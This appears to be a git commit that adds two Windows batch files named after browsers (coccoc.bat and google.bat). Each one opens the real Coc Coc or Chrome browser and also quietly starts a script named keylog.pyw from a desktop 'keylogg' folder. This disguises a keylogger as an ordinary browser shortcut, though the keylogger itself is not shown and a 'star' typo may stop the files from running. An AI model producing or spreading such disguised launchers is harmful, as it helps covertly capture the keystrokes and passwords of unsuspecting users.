6baf7e78f43109e9ab0da2498847e46e050e4f86
thanhngucomvn999 <nguyendang1246810@Gmail.com>
2024-03-17 16:40:52 +0700

    init project

---
+++ coccoc.bat
@@ -0,0 +1,2 @@
+star "" "C:\Program Files\CocCoc\Browser\Application\browser.exe"
+star "" "C:\Users\VAN HA\Desktop\keylogg\keylog.pyw
---
+++ google.bat
@@ -0,0 +1,2 @@
+star "" "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+star "" "C:\Users\VAN HA\Desktop\keylogg\keylog.pyw
